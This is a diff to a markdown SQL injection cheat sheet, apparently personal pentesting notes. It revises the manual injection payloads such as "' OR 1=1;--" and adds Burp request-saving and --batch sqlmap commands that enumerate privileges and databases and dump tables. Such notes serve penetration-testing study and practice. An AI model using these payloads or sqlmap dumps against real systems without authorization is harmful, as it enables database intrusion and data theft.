@@ -85,30 +85,37 @@ RCE Payload 2
 
 ## Manual
 
-Basic Test 1
-`admin' or 1=1--`
+Basic Error Test
+`text'`
 
-Basic Test 2
-`admin' or 1=1#`
+Confirm SQL Injection Possible (if error goes away)
+Note: The last dash protects the trailing space, which can get removed otherwise
+`text' -- -`
+
+Circumvent Query Condition
+`' OR 1=1;--`
 
 ## sqlmap
 
 ### Request
 
-Initial Tests
-`sqlmap -r http-request.txt`
+Save Request
+`In burp, intercept the request, and right click > Save Item. (E.g.: request.req)`
+
+Initial Tests (--batch accepts all defaults to prompts)
+`sqlmap -r request.req --batch`
 
 Check User Privs (E.g., FILE)
-`sqlmap -r http-request.txt --privileges`
+`sqlmap -r request.req --batch --privileges`
 
 Enumerate databases
-`sqlmap -r http-request.txt --dbs`
+`sqlmap -r request.req --batch --dbs`
 
 Get table names from dbname database
-`sqlmap -r http-request.txt -D dbname --tables`
+`sqlmap -r request.req -D dbname --tables`
 
 Dump the tblname table
-`sqlmap -r http-request.txt -D dbname -T tblname --dump`
+`sqlmap -r request.req -D dbname -T tblname --dump`
 
 ### CLI Spec
 
